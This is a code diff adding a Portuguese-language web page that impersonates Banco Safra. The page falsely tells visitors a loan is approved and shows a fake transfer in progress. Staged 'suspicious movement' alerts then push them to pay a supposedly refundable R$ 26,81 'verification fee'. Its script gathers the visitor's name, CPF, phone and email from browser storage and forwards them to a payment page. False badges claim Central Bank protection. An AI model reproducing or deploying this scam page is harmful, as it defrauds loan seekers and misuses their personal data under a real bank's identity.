@@ -1,0 +1,737 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<script src="../../js/utm.js"></script>
+<script src="../../js/tracking.js"></script>
+
+<meta charset="utf-8">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+    <title>Confirmação de Empréstimo</title>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&family=Plus+Jakarta+Sans:wght@500;600;700;800&family=Outfit:wght@400;500;600;700;800&display=swap');
+
+        :root {
+            --cred-primary: #020031;
+            --cred-light: #020031;
+            --cred-dark: #0B0A52;
+            --cred-accent: #111827;
+            --bg: #F4F5F7;
+            --text: #1f2937;
+            --muted: #6b7280;
+            --card: #ffffff;
+            --border: #e5e7eb;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'DM Sans', Arial, Helvetica, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 1rem;
+        }
+
+        .card,
+        .loading,
+        .card-final {
+            padding: 1.5rem;
+            max-width: 420px;
+            width: 100%;
+            display: none;
+            flex-direction: column;
+            gap: .75rem;
+            margin: 0 auto;
+            background: var(--card);
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(2, 0, 49, 0.08);
+        }
+
+        .card.active,
+        .loading.active,
+        .card-final.active {
+            display: flex;
+        }
+
+        /* Logo Safra */
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 1rem;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            user-select: none;
+        }
+
+        .logo-text {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            font-weight: 800;
+            font-size: 20px;
+            color: #111827;
+            letter-spacing: -0.5px;
+            line-height: 1;
+        }
+
+        .logo-on {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            font-weight: 800;
+            font-size: 20px;
+            color: #020031;
+            letter-spacing: -0.5px;
+            line-height: 1;
+        }
+
+        h2 {
+            font-size: 1.35rem;
+            font-weight: 700;
+            color: var(--cred-accent);
+            margin-bottom: .25rem;
+        }
+
+        .value {
+            font-size: 2.2rem;
+            font-weight: 800;
+            color: #020031;
+            margin-bottom: .25rem;
+        }
+
+        .recipient {
+            font-size: .98rem;
+            color: #4b5563;
+            margin-bottom: 1rem;
+        }
+
+        .recipient b {
+            font-weight: 600;
+            color: #111827;
+        }
+
+        .info-line {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: .95rem;
+            margin-bottom: .6rem;
+            color: #374151;
+            padding: 0.5rem 0;
+            border-bottom: 1px solid #f3f4f6;
+        }
+
+        .info-line:last-of-type {
+            border-bottom: none;
+        }
+
+        .info-line span:last-child {
+            font-weight: 600;
+            color: #111827;
+        }
+
+        .box {
+            margin-top: 1rem;
+            background: linear-gradient(135deg, #F8F8F8 0%, #E8EAF6 100%);
+            border: 1px solid rgba(15,0,61,0.15);
+            border-radius: 12px;
+            padding: 1rem;
+            font-size: .95rem;
+            color: var(--cred-accent);
+            text-align: left;
+            line-height: 1.5;
+        }
+
+        .box-icon {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+            color: #020031;
+        }
+
+        .button,
+        .final-button {
+            display: block;
+            margin-top: 1rem;
+            width: 100%;
+            background: linear-gradient(90deg, #020031 0%, #FDAC17 100%);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            padding: 1rem 1.5rem;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            text-align: center;
+            transition: transform .06s ease, filter .2s ease, box-shadow .2s ease;
+            box-shadow: 0 4px 15px rgba(2, 0, 49, 0.3);
+        }
+
+        .button:active,
+        .final-button:active {
+            transform: scale(0.98);
+        }
+
+        .button:hover,
+        .final-button:hover {
+            filter: brightness(1.05);
+            box-shadow: 0 6px 20px rgba(2, 0, 49, 0.4);
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background-color: #e5e7eb;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        .progress-bar-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #020031 0%, #FDAC17 100%);
+            transition: width .1s linear;
+            border-radius: 8px;
+        }
+
+        .status-text {
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-bottom: .75rem;
+            color: #020031;
+            text-align: center;
+        }
+
+        .fade-out-up {
+            opacity: 0;
+            transform: translateY(-12px);
+            transition: .3s ease;
+        }
+
+        .fade-in-up {
+            opacity: 1;
+            transform: translateY(0);
+            transition: .3s ease;
+        }
+
+        .wrapper-final {
+            background-color: #F8F8F8;
+            padding: 1rem;
+            border-radius: 1rem;
+            display: grid;
+            grid-template-rows: repeat(3, auto);
+            gap: .6rem;
+            min-height: 260px;
+        }
+
+        .alert-box {
+            background: #fff;
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1rem;
+            display: none;
+            align-items: center;
+            gap: .75rem;
+            font-size: .95rem;
+            color: #374151;
+            opacity: 0;
+            transform: translateY(10px);
+            animation: fadeInUp .3s ease forwards;
+        }
+
+        .alert-box.strong {
+            background: linear-gradient(135deg, #F8F8F8 0%, #E8EAF6 100%);
+            border-color: rgba(15,0,61,0.15);
+            color: var(--cred-accent);
+            font-weight: 600;
+        }
+
+        @keyframes fadeInUp {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .icon-img {
+            width: 2rem;
+            height: 2rem;
+        }
+
+        .spinner {
+            border: 3px solid #E8EAF6;
+            border-top: 3px solid #020031;
+            border-radius: 50%;
+            width: 28px;
+            height: 28px;
+            animation: spin .7s linear infinite;
+            margin: 12px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes pulse-green {
+            0% { box-shadow: 0 4px 15px rgba(2, 0, 49, 0.3); }
+            50% { box-shadow: 0 4px 25px rgba(2, 0, 49, 0.6); }
+            100% { box-shadow: 0 4px 15px rgba(2, 0, 49, 0.3); }
+        }
+
+        .pulse-green {
+            animation: pulse-green 2s infinite;
+        }
+
+        /* Badge de segurança */
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            margin-top: 1rem;
+            padding: 0.75rem;
+            background: #f9fafb;
+            border-radius: 8px;
+            font-size: 0.85rem;
+            color: #6b7280;
+        }
+
+        .security-badge svg {
+            width: 16px;
+            height: 16px;
+            color: var(--cred-primary);
+        }
+
+        /* Footer */
+        .footer {
+            margin-top: 2rem;
+            text-align: center;
+            padding: 1rem;
+        }
+
+        .footer-logo {
+            height: 32px;
+            margin-bottom: 0.5rem;
+        }
+
+        .footer small {
+            font-size: 0.75rem;
+            color: #9ca3af;
+            line-height: 1.4;
+        }
+
+        /* Loading container styling */
+        .loading {
+            text-align: center;
+            padding: 3rem 1.5rem;
+        }
+
+        .loading .spinner {
+            width: 48px;
+            height: 48px;
+            border-width: 4px;
+            margin-bottom: 1.5rem;
+        }
+    
+/* =================== FOOTER SAFRA =================== */
+.ss-footer{background:#fff;border-top:1px solid #E5E7EB;padding:32px 20px 24px;text-align:center;font-family:"DM Sans",-apple-system,BlinkMacSystemFont,sans-serif;color:#6B7280;font-size:14px;line-height:1.6}
+.ss-footer-logo{margin-bottom:16px}
+.ss-footer-logo img{height:28px;width:auto;display:inline-block}
+.ss-footer-company{font-size:14px;font-weight:700;color:#111827;margin-bottom:4px}
+.ss-footer-addr{font-size:12px;color:#9CA3AF;margin-bottom:16px}
+.ss-footer-links{display:flex;justify-content:center;gap:8px;flex-wrap:wrap;margin-bottom:16px;padding-top:16px;border-top:1px solid #E5E7EB}
+.ss-footer-links a{color:#374151;text-decoration:none;font-size:12px;font-weight:500;cursor:pointer}
+.ss-footer-links a:hover{color:#F97316}
+.ss-footer-links span{opacity:.4;font-size:12px}
+.ss-footer-badges{display:flex;align-items:center;justify-content:center;gap:16px;flex-wrap:wrap}
+.ss-footer-badges span{display:flex;align-items:center;gap:4px;font-size:11px;color:#6B7280;font-weight:500}
+.ss-footer-badges svg{width:14px;height:14px;color:#020031}
+.ss-dialog{border:0;padding:0;border-radius:20px;color:#111827;max-width:600px;width:calc(100% - 32px);box-shadow:0 20px 60px rgba(0,0,0,.2)}
+.ss-dialog::backdrop{background:rgba(0,0,0,.5);backdrop-filter:blur(4px)}
+.ss-dialog-head{display:flex;justify-content:space-between;align-items:center;padding:24px 24px 20px;border-bottom:1px solid #E5E7EB}
+.ss-dialog-head h2{font-family:"DM Sans",sans-serif;font-size:20px;font-weight:700;margin:0}
+.ss-dialog-close{background:none;border:none;font-size:32px;color:#6B7280;cursor:pointer;width:36px;height:36px;display:flex;align-items:center;justify-content:center;border-radius:50%;transition:all .2s;line-height:1;padding:0}
+.ss-dialog-close:hover{background:#F3F4F6;color:#111827}
+.ss-dialog-body{padding:24px;overflow-y:auto;max-height:70vh}
+.ss-dialog-body h3{font-size:17px;font-weight:700;color:#111827;margin:24px 0 12px}
+.ss-dialog-body h3:first-child{margin-top:0}
+.ss-dialog-body p{font-size:14px;line-height:1.7;color:#6B7280;margin-bottom:16px}
+.ss-dialog-body ul{margin:12px 0 16px 20px;padding:0}
+.ss-dialog-body li{font-size:14px;line-height:1.7;color:#6B7280;margin-bottom:8px}
+.ss-contact-item{display:flex;gap:16px;align-items:flex-start;padding:20px;background:#FAFBFC;border:1px solid #E5E7EB;border-radius:16px;margin-bottom:12px}
+.ss-contact-icon{width:48px;height:48px;background:#020031;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.ss-contact-icon svg{color:#fff;width:24px;height:24px}
+.ss-contact-item h4{font-size:15px;font-weight:700;color:#111827;margin:0 0 4px}
+.ss-contact-item p{font-size:14px;color:#6B7280;margin:0}
+.ss-contact-note{margin-top:16px;padding:20px;background:#FAFBFC;border:1px solid #E5E7EB;border-radius:12px}
+.ss-contact-note p{font-size:13px;line-height:1.6;color:#374151;margin-bottom:8px}
+.ss-contact-note p:last-child{margin-bottom:0}
+.ss-contact-note strong{color:#020031}
+
+</style>
+</head>
+
+<body>
+    <!-- CARD INICIAL -->
+    <div class="card active" id="card">
+        <div class="logo-container">
+            <img src="../../images/logo.png?v=safra2" alt="Safra" style="height:32px;">
+        </div>
+
+        <h2><svg width="24" height="24" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="display:inline;vertical-align:middle;margin-right:8px;color:var(--cred-primary)"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>Empréstimo Aprovado</h2>
+        <div class="value" id="value">R$ 0,00</div>
+        <div class="recipient">para <b id="nome-completo">Usuário</b></div>
+        
+        <div class="info-line"><span>CPF</span><span id="cpf">xxx.xxx.xxx-xx</span></div>
+        <div class="info-line"><span>Tipo de transferência</span><span>Pix</span></div>
+        <div class="info-line"><span>Data</span><span id="data">08/09/2026</span></div>
+        
+        <div class="box">
+            <div class="box-icon">
+                <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                </svg>
+                Crédito Liberado
+            </div>
+            Seu valor está disponível para liberação imediata. Confira seus dados e prossiga para confirmar a transferência para sua chave Pix cadastrada.
+        </div>
+        
+        <button class="button pulse-green" onclick="iniciarTransferencia()">
+            <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="display:inline;vertical-align:middle;margin-right:6px;"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+            Confirmar transferência
+        </button>
+        
+        <div class="security-badge">
+            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
+            </svg>
+            Ambiente seguro e criptografado
+        </div>
+    </div>
+
+    <!-- TELA DE CARREGAMENTO -->
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+        <h2 id="status-text" class="status-text">Processando...</h2>
+        <div class="progress-bar">
+            <div class="progress-bar-fill" id="bar"></div>
+        </div>
+    </div>
+
+    <!-- CARD FINAL -->
+    <div class="card-final" id="card-final">
+        <div class="logo-container">
+            <img src="../../images/logo.png?v=safra2" alt="Safra" style="height:32px;">
+        </div>
+
+        <h2 style="font-size: 1.25rem; margin-bottom: .5rem;"><svg width="22" height="22" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="display:inline;vertical-align:middle;margin-right:8px;color:var(--cred-primary)"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-3 7h3m-3 4h3m-6-4h.01M9 16h.01"></path></svg>Comprovante de solicitação</h2>
+        <div class="wrapper-final"></div>
+        <button class="final-button pulse-green" onclick="redirect()">Pagar Taxa de verificação</button>
+        
+        <div class="security-badge">
+            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
+            </svg>
+            Transação protegida pelo Banco Central
+        </div>
+    </div>
+
+    <!-- Footer -->
+
+    <script>
+        // =============== UTIL ===============
+        const LS = {
+            read(k, fb = "") { try { const v = localStorage.getItem(k); return (v ?? "").toString().trim() || fb; } catch { return fb; } },
+            readJSON(k, fb = {}) { try { const r = localStorage.getItem(k); if (!r) return fb; const o = JSON.parse(r); return (o && typeof o === "object") ? o : fb; } catch { return fb; } },
+            write(k, v) { try { localStorage.setItem(k, String(v)); } catch { } },
+            writeJSON(k, o) { try { localStorage.setItem(k, JSON.stringify(o || {})); } catch { } },
+        };
+        const firstNonEmpty = (...vals) => { for (const v of vals) { if (v == null) continue; const s = String(v).trim(); if (s) return s; } return ""; };
+        const normalizeToNumber = v => {
+            if (typeof v === "number" && Number.isFinite(v)) return v; if (!v) return 0;
+            let s = String(v).replace(/\s+/g, ""); if (/,/.test(s) && /\./.test(s)) s = s.replace(/\./g, "").replace(",", "."); else if (/,/.test(s)) s = s.replace(",", ".");
+            s = s.replace(/[^\d.-]/g, ""); const n = Number(s); return Number.isFinite(n) ? n : 0;
+        };
+        const formatBRL = n => { try { return n.toLocaleString("pt-BR", { style: "currency", currency: "BRL" }); } catch { return "R$ " + (Math.round(n * 100) / 100).toFixed(2).replace(".", ","); } };
+        const formatCPF = cpf => { const c = String(cpf || "").replace(/\D/g, ""); return c.length === 11 ? c.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4") : "xxx.xxx.xxx-xx"; };
+
+        // =============== STATE/HYDRATE ===============
+        function hydrate() {
+            const userData = LS.readJSON("userData");
+            const dadosUsuario = LS.readJSON("dadosUsuario");
+            const utmParams = LS.readJSON("utmParams");
+            const checkoutData = LS.readJSON("checkoutData");
+
+            const nome = firstNonEmpty(
+                LS.read("nome"),
+                LS.read("name"),
+                LS.read("nomeUsuario"),
+                userData.name,
+                dadosUsuario.NOME,
+                checkoutData.name,
+                "Usuário"
+            );
+
+            const cpf = firstNonEmpty(
+                LS.read("cpf"),
+                LS.read("document"),
+                LS.read("cpfUsuario"),
+                userData.cpf,
+                dadosUsuario.CPF,
+                checkoutData.cpf
+            );
+
+            const telefone = firstNonEmpty(
+                LS.read("telephone"),
+                LS.read("phone"),
+                LS.read("telefone"),
+                dadosUsuario.TELEFONE,
+                checkoutData.phone
+            );
+
+            const email = firstNonEmpty(
+                LS.read("email"),
+                dadosUsuario.EMAIL,
+                dadosUsuario["E-MAIL"],
+                dadosUsuario.E_MAIL,
+                userData.email,
+                checkoutData.email
+            );
+
+            const credito = firstNonEmpty(
+                LS.read("selectedLoanAmount"),
+                LS.read("creditoSolicitado"),
+                LS.read("valorEmprestimo"),
+                LS.read("valorAprovado"),
+                checkoutData.valor,
+                LS.read("valor")
+            );
+            const creditoNumber = normalizeToNumber(credito);
+            const valorFormatado = creditoNumber > 0 ? formatBRL(creditoNumber) : "R$ 0,00";
+
+            const $nome = document.getElementById("nome-completo");
+            const $valor = document.getElementById("value");
+            const $cpf = document.getElementById("cpf");
+            const $data = document.getElementById("data");
+
+            if ($nome) $nome.textContent = nome || "Usuário";
+            if ($valor) $valor.textContent = valorFormatado;
+            if ($cpf) $cpf.textContent = cpf ? formatCPF(cpf) : "xxx.xxx.xxx-xx";
+            if ($data) {
+                const d = new Date();
+                $data.textContent = `${String(d.getDate()).padStart(2, '0')}/${String(d.getMonth() + 1).padStart(2, '0')}/${d.getFullYear()}`;
+            }
+
+            if (nome) LS.write("name", nome);
+            if (cpf) LS.write("document", cpf);
+            if (telefone) LS.write("telephone", telefone);
+            if (email) LS.write("email", email);
+            if (credito) LS.write("creditoSolicitado", creditoNumber || credito);
+
+            console.info("[Safra] hydrate()", {
+                origin: location.origin,
+                length: (() => { try { return localStorage.length } catch { return "blocked"; } })(),
+                nome, cpf, telefone, email, credito: creditoNumber, utmParams
+            });
+        }
+
+        window.iniciarTransferencia = function () {
+            document.getElementById("card")?.classList.remove("active");
+            document.getElementById("loading")?.classList.add("active");
+            const bar = document.getElementById("bar");
+            const statusText = document.getElementById("status-text");
+            let progress = 0, trocado = false;
+            const it = setInterval(() => {
+                if (progress >= 100) {
+                    clearInterval(it);
+                    document.getElementById("loading")?.classList.remove("active");
+                    document.getElementById("card-final")?.classList.add("active");
+                    exibirAlertasComSpinner();
+                } else {
+                    progress++;
+                    if (bar) bar.style.width = progress + "%";
+                    if (progress === 70 && !trocado && statusText) {
+                        trocado = true;
+                        statusText.classList.add("fade-out-up");
+                        setTimeout(() => {
+                            statusText.textContent = "Finalizando...";
+                            statusText.classList.remove("fade-out-up");
+                            statusText.classList.add("fade-in-up");
+                        }, 300);
+                    }
+                }
+            }, 30);
+        };
+
+        // Monta os parâmetros do checkout a partir do localStorage (dados já preenchidos no funil),
+        // com fallback entre as variações de nome de chave, e preserva as UTMs da URL atual.
+        function buildCheckoutParams() {
+            const g = (...ks) => { for (const k of ks) { try { const v = localStorage.getItem(k); if (v && v.trim()) return v.trim(); } catch (e) {} } return ""; };
+            // Preserva TODAS as UTMs/parâmetros já presentes na URL (utm_*, src, sck, fbclid, gclid, xcod, etc.)
+            const p = new URLSearchParams(window.location.search);
+            ["offer","pix_total","seguro_price","bump1","amount","cotacao_index"].forEach(function(k){ p.delete(k); });
+            const setIfMissing = (k, v) => { if (v && !p.get(k)) p.set(k, v); };
+            setIfMissing("name", g("name", "nome", "nomeUsuario"));
+            setIfMissing("email", g("email"));
+            setIfMissing("telephone", g("telephone", "telefone"));
+            setIfMissing("document", g("document", "cpf", "cpfUsuario"));
+            return p.toString();
+        }
+
+        window.redirect = function () {
+            window.location.href = "../../pagamento/?offer=up1&" + buildCheckoutParams();
+        };
+
+        document.addEventListener("DOMContentLoaded", hydrate);
+        window.addEventListener("load", () => { try { hydrate(); } catch (e) { console.warn("hydrate@load", e); } });
+    </script>
+    
+    <script>
+        function escapeHTML(str) {
+            return String(str)
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;')
+                .replace(/'/g, '&#39;');
+        }
+
+        function nl2brSafe(str) {
+            return escapeHTML(str).replace(/\n/g, '<br>');
+        }
+
+        function exibirAlertasComSpinner() {
+            const wrapper = document.querySelector(".wrapper-final");
+            if (!wrapper) return;
+            wrapper.innerHTML = "";
+
+            const alerts = [
+                { 
+                    icon: "https://i.postimg.cc/7ZXmSY20/logofalha.png", 
+                    text: "Identificamos uma movimentação de valor alto suspeita!" 
+                },
+                { 
+                    icon: "https://i.postimg.cc/7ZXmSY20/logofalha.png", 
+                    text: "Por motivos de segurança é preciso realizar o pagamento da Taxa de Verificação de Conta para garantir a transferência segura e evitar possíveis fraudes." 
+                },
+                { 
+                    icon: "https://i.postimg.cc/7ZXmSY20/logofalha.png", 
+                    text: "Finalize o pagamento da Taxa de Verificação de Conta no valor de R$ 26,81 e confirme seu empréstimo. Essa taxa é reembolsável e será devolvida automaticamente após a confirmação do pagamento.", 
+                    strong: true 
+                }
+            ];
+
+            let index = 0;
+
+            function showNext() {
+                if (index >= alerts.length) return;
+
+                const spinner = document.createElement("div");
+                spinner.className = "spinner";
+                wrapper.appendChild(spinner);
+
+                setTimeout(() => {
+                    spinner.remove();
+
+                    const a = alerts[index];
+                    const box = document.createElement("div");
+                    box.className = "alert-box" + (a.strong ? " strong" : "");
+
+                    const icon = document.createElement("img");
+                    icon.className = "icon-img";
+                    icon.alt = "Info";
+                    icon.src = a.icon;
+
+                    const txt = document.createElement("div");
+                    txt.innerHTML = nl2brSafe(a.text);
+
+                    box.appendChild(icon);
+                    box.appendChild(txt);
+                    wrapper.appendChild(box);
+
+                    requestAnimationFrame(() => {
+                        box.style.display = "flex";
+                    });
+
+                    index++;
+                    setTimeout(showNext, 900);
+                }, 700);
+            }
+
+            showNext();
+        }
+    </script>
+
+    <script src="js/n3ut99mHdE7V.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            initUpsell(1);
+        });
+    </script>
+<!-- FOOTER SAFRA -->
+<footer class="ss-footer">
+  <div class="ss-footer-logo"><img src="../../images/logo.png?v=safra2" alt="Safra"></div>
+  <p class="ss-footer-company">&copy; 2025 Pagamentos S.A &ndash; Instituição de Pagamento.</p>
+  <p class="ss-footer-addr">São Paulo, SP &ndash; CEP 05409-000</p>
+  <div class="ss-footer-links">
+    <a onclick="document.getElementById('ss-termos').showModal();return false;">Termos de Uso</a><span>&bull;</span>
+    <a onclick="document.getElementById('ss-privacidade').showModal();return false;">Política de Privacidade</a><span>&bull;</span>
+    <a onclick="document.getElementById('ss-contato').showModal();return false;">Contato</a>
+  </div>
+  <div class="ss-footer-badges">
+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>SSL Seguro</span>
+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>Dados protegidos</span>
+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4"/></svg>Instituição regulada</span>
+  </div>
+</footer>
+
+<dialog id="ss-termos" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Termos de Uso</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <h3>1. Aceitação dos Termos</h3>
+    <p>Ao acessar e utilizar os serviços da Safra, você concorda com estes Termos de Uso.</p>
+    <h3>2. Serviços Oferecidos</h3>
+    <p>A Safra é uma instituição financeira digital que oferece serviços de empréstimo pessoal com aprovação rápida e processo 100% online.</p>
+    <h3>3. Elegibilidade</h3>
+    <ul><li>Ser maior de 18 anos</li><li>Possuir CPF válido</li><li>Ter conta bancária ativa em seu nome</li></ul>
+  </div>
+</dialog>
+
+<dialog id="ss-privacidade" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Política de Privacidade</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <h3>1. Coleta de Dados</h3>
+    <p>A Safra coleta dados pessoais, de contato, financeiros e de navegação.</p>
+    <h3>2. Seus Direitos (LGPD)</h3>
+    <ul><li>Acessar seus dados pessoais</li><li>Corrigir dados incompletos</li><li>Solicitar exclusão de dados</li></ul>
+  </div>
+</dialog>
+
+<dialog id="ss-contato" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Fale Conosco</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <div class="ss-contact-item"><div class="ss-contact-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24" width="24" height="24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg></div><div><h4>Email</h4><p>contato@safra.com.br</p></div></div>
+    <div class="ss-contact-item"><div class="ss-contact-icon"><svg fill="currentColor" viewBox="0 0 24 24" width="24" height="24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/></svg></div><div><h4>ParceiroChat</h4><p>(11) 98765-4321</p></div></div>
+    <div class="ss-contact-note"><p><strong>CNPJ:</strong> 58.160.789/0001-28</p><p><strong>Razão Social:</strong> Banco Safra S.A.</p></div>
+  </div>
+</dialog>
+
+<script>
+document.querySelectorAll('.ss-dialog').forEach(function(d){d.addEventListener('click',function(e){if(e.target===d)d.close();});});
+</script>
+
+<script>if(/^(localhost|127\.0\.0\.1)$/.test(location.hostname)){var s=document.createElement("script");s.src="/dev-mode.js";document.body.appendChild(s);}</script>
+<script src="../../js/devnav.js"></script>
+</body></html>
